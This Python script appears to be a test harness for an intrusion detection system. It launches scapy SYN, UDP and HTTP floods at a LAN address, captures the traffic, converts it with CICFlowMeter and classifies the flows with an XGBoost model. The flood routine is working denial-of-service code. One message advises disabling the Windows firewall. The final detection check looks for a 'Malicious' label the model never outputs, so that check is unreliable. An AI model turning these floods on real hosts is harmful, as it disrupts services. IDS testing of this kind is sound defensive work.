import subprocess
import os
import time
from datetime import datetime
import pyshark
import pandas as pd
import numpy as np
import joblib
from scapy.all import *
import threading
from cols import column_rename_map as columns
def capture_pcap(interface, capture_duration, output_pcap):
    """Capture network packets from a specific interface for a given duration."""
    try:
        print(f"[+] Capturing network traffic for {capture_duration} seconds from interface {interface}...")
        capture = pyshark.LiveCapture(interface=interface, output_file=output_pcap)
        capture.sniff(timeout=capture_duration)
        print(f"[+] Packet capture completed: {output_pcap}")
        return True
    except Exception as e:
        print(f"[!] An error occurred while capturing traffic: {e}")
        return False

def run_cfm(cfm_path, input_file, output_folder):
    """Run CICFlowMeter on the given .pcap file to generate flow statistics."""
    try:
        print(f"[+] Running CICFlowMeter on {input_file}...")
        original_working_dir = os.getcwd()
        bin_directory = os.path.dirname(cfm_path)
        os.chdir(bin_directory)

        command = f"cfm.bat {input_file} {output_folder}"
        print(f"[i] Executing: {command}")
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True
        )

        stdout, stderr = process.communicate()

        os.chdir(original_working_dir)

        if process.returncode != 0:
            print(f"[!] Error running CICFlowMeter:\n{stderr}")
            return False
        else:
            print(f"[+] CICFlowMeter completed.\n{stdout}")
            return True

    except Exception as e:
        print(f"[!] An error occurred while running CICFlowMeter: {e}")
        return False

import pandas as pd
import joblib
import xgboost as xgb

import pandas as pd
import joblib
import xgboost as xgb
import numpy as np

class_id_to_label = {
    0: "BENIGN",
    1: "Bot",
    2: 'DDoS',
    3: 'DoS GoldenEye',
    4: 'DoS Hulk',
    5: 'DoS Slowhttptest',
    6: 'DoS slowloris',
    7: 'FTP-Patator',
    8: 'Heartbleed',
    9: 'Infiltration',
    10: 'PortScan',
    11: 'SSH-Patator',
    12: 'Web Attack - Brute Force',
    13: 'Web Attack - Sql Injection',
    14: 'Web Attack - XSS',   
}
def predict_anomalies(csv_path, model_path="xgb_ids_model.json"):
    try:
        print(f"[+] Using CSV file: {csv_path}")
        print("[+] Loading XGBoost model...")
        model = xgb.Booster()
        model.load_model(model_path)

        print("[+] Reading input CSV...")
        df = pd.read_csv(csv_path)
        df_original = df.copy()

        # Drop non-numeric columns
        non_numeric_cols = ['Flow ID', 'Src IP', 'Dst IP', 'Timestamp', 'Label', 'Src Port', 'Dst Port',]
        df = df.drop(columns=[col for col in non_numeric_cols if col in df.columns])
        df.rename(columns=columns, inplace=True)
        print(f"[+] Model expects {df.shape[1]} features")

        # Ensure all columns are numeric
        df = df.apply(pd.to_numeric, errors='coerce')
        df = df.fillna(0)

        print(f"[+] Predicting on {df.shape[0]} records...")
        dmatrix = xgb.DMatrix(df)
        preds = model.predict(dmatrix)
        predicted_classes = [class_id_to_label.get(int(x), "Unknown") for x in np.argmax(preds, axis=1)]

        df_original['Prediction'] = predicted_classes
        output_path = csv_path.replace(".csv", "_with_predictions.csv")
        df_original.to_csv(output_path, index=False)

        print(f"[+] Predictions saved to {output_path}")
        print("\n[+] Prediction Summary:")
        print(df_original['Prediction'].value_counts())

        return df_original

    except Exception as e:
        print(f"[!] Error during prediction: {e}")
        return None


def verify_capture(pcap_file, expected_syn=1000, expected_udp=500):
    """Verify attack packets were actually captured"""
    try:
        packets = rdpcap(pcap_file)
        syn_count = len([p for p in packets if TCP in p and p[TCP].flags & 0x02])
        udp_count = len([p for p in packets if UDP in p])
        http_count = len([p for p in packets if TCP in p and p[TCP].dport == 80 and Raw in p])
        
        print(f"\n[+] Capture Verification:")
        print(f"SYN packets: {syn_count} (expected ≥{expected_syn})")
        print(f"UDP packets: {udp_count} (expected ≥{expected_udp})")
        print(f"HTTP packets: {http_count}")
        
        if syn_count < expected_syn/10:  # 10% threshold
            print("\n[!] CRITICAL: SYN packets not being captured properly")
            print("Solutions:")
            print("1. Run as Administrator")
            print("2. Use wired connection instead of Wi-Fi")
            print("3. Try different network interface")
            print("4. Disable firewall temporarily: netsh advfirewall set allprofiles state off")
            return False
        return True
    except Exception as e:
        print(f"[!] Capture verification failed: {e}")
        return False
def launch_attack(target_ip="192.168.18.3"):
    """Enhanced attack function with verification"""
    try:
        print("[+] Starting attacks in 5 seconds...")
        time.sleep(5)
        
        # Phase 1: Intense SYN Flood
        print("[+] Launching 10,000 SYN packets to port 80")
        send(IP(dst=target_ip)/TCP(dport=80, flags="S", seq=RandInt()), 
             count=10000, verbose=0)
        
        # Phase 2: High-rate UDP Flood
        print("[+] Launching 5,000 UDP packets to port 53")
        send(IP(dst=target_ip)/UDP(dport=53)/Raw(load="X"*1500),
             count=5000, inter=0.001, verbose=0)
        
        # Phase 3: HTTP Flood with abnormal patterns
        print("[+] Launching HTTP flood with malicious patterns")
        for i in range(200):
            # Random malformed HTTP requests
            payload = f"GET /{''.join(random.choices(string.ascii_letters, k=1000))} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            send(IP(dst=target_ip)/TCP(dport=80, flags="PA")/payload, 
                 verbose=0)
        
        print("[+] Attacks completed")
    except Exception as e:
        print(f"[!] Attack error: {e}")

def main():
    # Configuration
    #make your own folder for cfm, input_folder and output_folder and replace it with your own path
    cfm_path = r"D:\IDS-Project\CICFlowMeter-4.0\bin\cfm.bat"
    input_folder = r"D:\IDS-Project\pcap_store"
    output_folder = r"D:\IDS-Project\output"
    interface = "Wi-Fi"
    capture_duration = 10  # seconds
    target_ip = "192.168.18.3"  # Change to your target IP

    # Create directories if they don't exist
    os.makedirs(input_folder, exist_ok=True)
    os.makedirs(output_folder, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_pcap = os.path.join(input_folder, f"attack_traffic_{timestamp}.pcap")

    # Start attack thread
    attack_thread = threading.Thread(target=launch_attack, args=(target_ip,))
    attack_thread.daemon = True
    attack_thread.start()

    # Step 1: Capture packets (will include attacks)
    if not capture_pcap(interface, capture_duration, output_pcap):
        print("[!] Packet capture failed. Exiting.")
        return

    # Step 2: Convert pcap to CSV using CICFlowMeter
    if not run_cfm(cfm_path, output_pcap, output_folder):
        print("[!] CICFlowMeter failed. Exiting.")
        return
    
    verify_capture(output_pcap)
     

    # Step 3: Find the generated CSV file
    csv_files = [f for f in os.listdir(output_folder) 
                if f.startswith(os.path.basename(output_pcap)) and f.endswith(".csv")]

    latest_csv = os.path.join(output_folder, csv_files[0])
    print(f"[+] Using CSV file: {latest_csv}")

    # Step 4: Predict anomalies
    result_df = predict_anomalies(latest_csv)

    if result_df is not None:
        # Verify attack detection
        output_csv = latest_csv.replace(".csv", "_with_predictions.csv")
        if os.path.exists(output_csv):
            df = pd.read_csv(output_csv)
            if "Prediction" in df.columns:
                print("\n[+] Final Detection Results:")
                print(df['Prediction'].value_counts())
                
                if "Malicious" not in df['Prediction'].values:
                    print("\n[!] WARNING: No attacks detected. Possible issues:")
                    print("- Attacks not reaching monitoring interface")
                    print("- Firewall/IPS blocking attack packets")
                    print("- Model not trained for these attack types")
                    
                    # Debug: Check for SYN packets in capture
                    try:
                        packets = rdpcap(output_pcap)
                        syn_count = len([p for p in packets if TCP in p and p[TCP].flags & 0x02])
                        print(f"\n[DEBUG] Found {syn_count} SYN packets in capture")
                    except Exception as e:
                        print(f"\n[DEBUG] Could not analyze PCAP file: {e}")
            else:
                print("[!] No predictions found in output file")
        else:
            print(f"[!] Output file not found: {output_csv}")
    else:
        print("[!] Prediction failed")

if __name__ == "__main__":
    # Need admin privileges for raw packet sending
    if os.name == 'nt':
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("[!] Please run as Administrator for packet injection")
                exit(1)
        except:
            pass
    
    main()